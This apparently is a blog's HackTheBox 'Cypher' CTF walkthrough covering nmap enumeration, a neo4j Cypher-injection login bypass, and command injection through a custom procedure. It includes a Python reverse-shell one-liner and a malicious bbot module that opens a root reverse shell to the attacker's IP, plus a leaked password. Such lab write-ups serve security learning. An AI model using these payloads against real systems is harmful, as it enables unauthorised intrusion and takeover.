@@ -1,0 +1,294 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex" />
+
+  <!--  <link rel="manifest" href="/assets/site.webmanifest" crossorigin="use-credentials">-->
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+    href="http://localhost:1337/theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark), (prefers-color-scheme: no-preference)"
+          href="http://localhost:1337/theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light)"
+          href="http://localhost:1337/theme/pygments/emacs.min.css">
+
+
+  <link rel="stylesheet"
+        type="text/css"
+        href="http://localhost:1337/theme/stork/stork.css" />
+
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="http://localhost:1337/theme/font-awesome/css/solid.css">
+
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/custom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/zoom.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/collapsible-toc.css"> 
+        <link rel="stylesheet" type="text/css" href="http://localhost:1337/css/goals.css"> 
+
+
+      <script src="https://code.jquery.com/jquery-3.7.1.min.js" type="application/javascript"></script>
+      <script src="https://cdn.jsdelivr.net/npm/dompurify@3.2.4/dist/purify.min.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/collapsible-toc.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/zoom.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/app.js" type="application/javascript"></script>
+      <script src="http://localhost:1337/js/goals.js" type="application/javascript"></script>
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+<meta name="author" content="Jack69" />
+<meta name="description" content="Cypher is a &#34;Medium&#34; unix box. Enumeration Performing port scanning and service enumeration: nmap -sC -sV -oN cypher.nmap 10.10.11.57 Nmap scan report for 10.10.11.57 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22 …" />
+<meta name="keywords" content="">
+
+
+  <meta property="og:site_name" content="Jack's Corner"/>
+  <meta property="og:title" content="CTF: HackTheBox Cypher"/>
+  <meta property="og:description" content="Cypher is a &#34;Medium&#34; unix box. Enumeration Performing port scanning and service enumeration: nmap -sC -sV -oN cypher.nmap 10.10.11.57 Nmap scan report for 10.10.11.57 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22 …"/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="http://localhost:1337/ctf/htb/cypher.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2025-03-08 18:00:00+01:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="http://localhost:1337/author/jack69.html">
+  <meta property="article:section" content="CTF"/>
+  <meta property="og:image" content="">
+
+  <title>Jack's Corner &ndash; CTF: HackTheBox Cypher</title>
+
+
+</head>
+<body >
+
+<aside>
+  <div>
+    <a href="http://localhost:1337/">
+      <img src="http://localhost:1337/theme/img/profile.png" alt="Jack's Corner" title="Jack's Corner">
+    </a>
+
+    <h1>
+      <a href="http://localhost:1337/">Jack's Corner</a>
+    </h1>
+
+
+    <div class="stork">
+        <input class="stork-input" type="text" autocomplete="off" name="q" data-stork="sitesearch" placeholder="Search..." onclick=""/>
+      <div class="stork-output" data-stork="sitesearch-output"></div>
+    </div>
+
+
+    <ul class="social">
+      <li>
+        <a class="sc-htb"
+           href="https://app.hackthebox.com/profile/177323"
+           target="_blank">
+          <i class="fa-brands fa-htb"></i>
+        </a>
+      </li>
+      <li>
+        <a class="sc-thm"
+           href="https://tryhackme.com/p/jack69"
+           target="_blank">
+          <i class="fa-brands fa-thm"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+</aside>
+  <main>
+
+<nav>
+  <a href="http://localhost:1337/">Home</a>
+
+  <a href="/categories.html">Categories</a>
+  <a href="/category/cheatsheet.html">Cheatsheets</a>
+  <a href="/personal/goals.html">Goals</a>
+
+
+</nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="ctf/htb/cypher">CTF: HackTheBox Cypher</h1>
+    <p>
+
+    </p>
+  </header>
+
+
+  <div>
+        <div class="toc col-lg-3 hidden-xs hidden-sm">
+            <div id="toc"><ul><li><a class="toc-href" href="#enumeration" title="Enumeration">Enumeration</a></li><li><a class="toc-href" href="#login-bypass" title="Login Bypass">Login Bypass</a></li><li><a class="toc-href" href="#rce" title="RCE">RCE</a></li><li><a class="toc-href" href="#lateral-movement" title="Lateral Movement">Lateral Movement</a></li><li><a class="toc-href" href="#privilege-escalation" title="Privilege Escalation">Privilege Escalation</a></li></ul></div>
+        </div>
+    <p>Cypher  is a "Medium" unix box.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Performing port scanning and service enumeration:</p>
+<div class="highlight"><pre><span></span><code><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">sC</span><span class="w"> </span><span class="o">-</span><span class="nx">sV</span><span class="w"> </span><span class="o">-</span><span class="nx">oN</span><span class="w"> </span><span class="nx">cypher</span><span class="p">.</span><span class="nx">nmap</span><span class="w"> </span><span class="m m-Double">10.10.11.57</span>
+
+<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">10.10.11.57</span>
+<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.17</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
+<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">998</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">tcp</span><span class="w"> </span><span class="nx">ports</span><span class="w"> </span><span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
+<span class="nx">PORT</span><span class="w">   </span><span class="nx">STATE</span><span class="w"> </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">ssh</span><span class="w">     </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">9.6</span><span class="nx">p1</span><span class="w"> </span><span class="nx">Ubuntu</span><span class="w"> </span><span class="mi">3</span><span class="nx">ubuntu13</span><span class="m m-Double">.8</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
+<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span><span class="w"> </span>
+<span class="o">|</span><span class="w">   </span><span class="mi">256</span><span class="w"> </span><span class="nx">be</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="nx">db</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="mi">8</span><span class="nx">e</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="nx">b7</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">7</span><span class="nx">b</span><span class="p">:</span><span class="mi">3</span><span class="nx">b</span><span class="p">:</span><span class="mi">52</span><span class="p">:</span><span class="nx">b0</span><span class="w"> </span><span class="p">(</span><span class="nx">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">256</span><span class="w"> </span><span class="nx">e5</span><span class="p">:</span><span class="mi">5</span><span class="nx">b</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="nx">f5</span><span class="p">:</span><span class="mi">54</span><span class="p">:</span><span class="mi">43</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="kt">f8</span><span class="p">:</span><span class="mi">7</span><span class="nx">e</span><span class="p">:</span><span class="nx">b6</span><span class="p">:</span><span class="mi">69</span><span class="p">:</span><span class="mi">4</span><span class="nx">c</span><span class="p">:</span><span class="nx">ac</span><span class="p">:</span><span class="nx">d6</span><span class="p">:</span><span class="mi">3</span><span class="nx">d</span><span class="p">:</span><span class="mi">23</span><span class="w"> </span><span class="p">(</span><span class="nx">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">open</span><span class="w">  </span><span class="nx">http</span><span class="w">    </span><span class="nx">nginx</span><span class="w"> </span><span class="m m-Double">1.24.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w"> </span><span class="nx">Did</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="nx">follow</span><span class="w"> </span><span class="nx">redirect</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">http</span><span class="p">:</span><span class="c1">//cypher.htb/</span>
+<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">server</span><span class="o">-</span><span class="nx">header</span><span class="p">:</span><span class="w"> </span><span class="nx">nginx</span><span class="o">/</span><span class="m m-Double">1.24.0</span><span class="w"> </span><span class="p">(</span><span class="nx">Ubuntu</span><span class="p">)</span>
+<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="p">;</span><span class="w"> </span><span class="nx">CPE</span><span class="p">:</span><span class="w"> </span><span class="nx">cpe</span><span class="p">:</span><span class="o">/</span><span class="nx">o</span><span class="p">:</span><span class="nx">linux</span><span class="p">:</span><span class="nx">linux_kernel</span>
+
+<span class="nx">Service</span><span class="w"> </span><span class="nx">detection</span><span class="w"> </span><span class="nx">performed</span><span class="p">.</span><span class="w"> </span><span class="nx">Please</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">incorrect</span><span class="w"> </span><span class="nx">results</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">https</span><span class="p">:</span><span class="c1">//nmap.org/submit/ .</span>
+<span class="err">#</span><span class="w"> </span><span class="nx">Nmap</span><span class="w"> </span><span class="nx">done</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">Sat</span><span class="w"> </span><span class="nx">Mar</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="mi">11</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">56</span><span class="w"> </span><span class="mi">2025</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="nx">IP</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">up</span><span class="p">)</span><span class="w"> </span><span class="nx">scanned</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m m-Double">754.09</span><span class="w"> </span><span class="nx">seconds</span>
+</code></pre></div>
+<p>After adding <code>cypher.htb</code> to <code>/etc/hosts</code>, the following home page is presented:</p>
+<p><img alt="cypher-home.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/cypher-home.png"/></p>
+<h2 id="login-bypass">Login Bypass</h2>
+<p>The demo functionality it's accessible only after a login but no registration is available:</p>
+<p><img alt="cypher-login.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/cypher-login.png"/></p>
+<p>Adding a single quote (<code>'</code>) breaks the query being performed on the backend that returns an error stack trace revealing that a cypher query on neo4j is being used; moreover, the query is returned in the error message.</p>
+<p><img alt="cypher-injection-error.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/cypher-injection-error.png"/></p>
+<p>This query retrieves the password hash for specified user. The hash seems to be calculated with SHA1. In order to bypass the login, the SHA1 hash of the specified password is returned in the injected query, resulting in a true evaluation when checking the hash:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">    </span><span class="nt">"username"</span><span class="p">:</span><span class="s2">"' or 1=1 RETURN 'd012f68144ed0f121d3cc330a17eec528c2e7d59' as hash //"</span><span class="p">,</span>
+<span class="w">    </span><span class="nt">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"pippo"</span>
+<span class="p">}</span>
+
+<span class="c1">// d012f68144ed0f121d3cc330a17eec528c2e7d59 = SHA1("pippo")</span>
+</code></pre></div>
+<p><img alt="cypher-injection-successfull.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/cypher-injection-successfull.png"/></p>
+<p>With the returned cookie, it's possible to navigate to the "demo" functionality:
+<img alt="cypher-demo.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/cypher-demo.png"/></p>
+<h2 id="rce">RCE</h2>
+<p>Performing a directory bruteforce a <code>/testing</code> endpoint is found:</p>
+<div class="highlight"><pre><span></span><code>gobuster<span class="w"> </span>dir<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt<span class="w"> </span>-u<span class="w"> </span>http://cypher.htb
+</code></pre></div>
+<p><img alt="directory-bruteforcing.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/directory-bruteforcing.png"/></p>
+<p>A <code>jar</code> file is hosted there:</p>
+<p><img alt="custom-jar.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/custom-jar.png"/></p>
+<p>By decompiling the <code>jar</code> with <code>jd-gui</code> allows to discover that it implements a custom procedure <code>getUrlStatusCode</code> for <code>neo4j</code>. This function is vulnerable to command injection:
+<img alt="custom-jar-decompiled.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/custom-jar-decompiled.png"/></p>
+<p>In the search query bar, the following query is run; this query will invoke the custom procedure and open a reverse shell on the attacker machine:</p>
+<p><img alt="cypher-query-bar.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/cypher-query-bar.png"/></p>
+<div class="highlight"><pre><span></span><code><span class="c1">CALL custom.getUrlStatusCode('http://10.10.14.39:8000/fake; python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.39",8090));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")\'');</span>
+</code></pre></div>
+<h2 id="lateral-movement">Lateral Movement</h2>
+<p>After the reverse shell is opened, it can be noticed that the <code>.bash-history</code> contains a password:</p>
+<p><img alt="graphasm-credentials-found.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/graphasm-credentials-found.png"/></p>
+<div class="highlight"><pre><span></span><code>cU4btyib.20xtCMCXkBmerhK
+</code></pre></div>
+<p>This password can be used for the other available user <code>graphasm</code>:</p>
+<p><img alt="graphasm-credentials check.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/graphasm-credentials check.png"/></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>User <code>graphasm</code> can run the command <code>/usr/local/bin/bbot</code> as super user:</p>
+<p><img alt="graphasm-sudo.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/graphasm-sudo.png"/></p>
+<p>After some research, <a href="https://github.com/blacklanternsecurity/bbot?tab=readme-ov-file">bbot</a> seems to be a tool used to perform realtime network scanning and enumeration generally used in bug bounty.</p>
+<p>From the documentation is found that it's possible to create custom modules; the following custom module is prepared:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">bbot.modules.base</span> <span class="kn">import</span> <span class="n">BaseModule</span>
+
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">pty</span>
+
+<span class="k">def</span> <span class="nf">revshell</span><span class="p">():</span>
+    <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">"10.10.14.39"</span><span class="p">,</span><span class="mi">8090</span><span class="p">))</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">pty</span><span class="o">.</span><span class="n">spawn</span><span class="p">(</span><span class="s2">"/bin/bash"</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">jack69</span><span class="p">(</span><span class="n">BaseModule</span><span class="p">):</span>
+
+    <span class="c1"># one-time setup - runs at the beginning of the scan</span>
+    <span class="k">async</span> <span class="k">def</span> <span class="nf">setup</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">revshell</span><span class="p">()</span>
+        <span class="k">pass</span>
+
+    <span class="k">async</span> <span class="k">def</span> <span class="nf">handle_event</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">event</span><span class="p">):</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</code></pre></div>
+<p>In order to run a module from a custom location (default location is not writable), it's necessary to run it from a preset with following configuration:</p>
+<p><img alt="bbot-custom-location.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/bbot-custom-location.png"/>
+The following preset is then prepared:</p>
+<div class="highlight"><pre><span></span><code><span class="n">module_dirs:</span>  
+&nbsp;- /<span class="n">tmp</span><span class="o">/</span><span class="n">tmp</span>.<span class="n">oMgKaVdZRA</span>  
+
+<span class="n">modules:</span>  
+&nbsp;- <span class="n">jack69</span>
+</code></pre></div>
+<p>Custom presets can be run as follows:</p>
+<p><img alt="bbot-custom-preset.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/bbot-custom-preset.png"/></p>
+<p>In the directory <code>/tmp/tmp.oMgKaVdZRA</code> the custom preset <code>mypreset.yml</code> and module <code>jack69.py</code> is run as follows, opening a reverse shell as root:</p>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>/usr/local/bin/bbot<span class="w"> </span>-p<span class="w"> </span>./mypreset.yml
+</code></pre></div>
+<p><img alt="bbot-root-revshell.png" src="http://localhost:1337/images/ctf/htb/machines/cypher/bbot-root-revshell.png"/></p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+    </p>
+  </div>
+
+
+
+
+
+
+</article>
+
+<footer>
+<p>&copy; Jack69 - 2025 </p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="dark"
+          type="text/javascript">
+  </script>
+</p></footer>  </main>
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " Jack's Corner ",
+  "url" : "http://localhost:1337",
+  "image": "",
+  "description": "My personal notes on stuff I like, nothing special"
+}
+</script>  <script>
+    window.loadStorkIndex = function () {
+      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
+      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
+    }
+  </script>
+  <script src="http://localhost:1337/theme/stork/stork.js"></script>
+
+</body>
+</html>
